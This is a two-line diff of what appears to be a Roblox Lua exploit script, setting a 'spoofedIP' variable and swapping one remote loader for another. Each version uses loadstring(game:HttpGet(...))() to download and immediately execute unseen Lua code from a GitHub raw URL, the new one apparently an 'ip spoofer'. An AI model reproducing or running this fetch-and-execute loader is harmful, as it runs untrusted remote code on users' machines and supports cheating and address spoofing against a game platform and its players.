@@ -1,2 +1,2 @@
 spoofedIP = "123.123.123.123"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/FazeHarambe/dh/main/rev", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FazeHarambe/dh/main/ip%20spofer", true))()
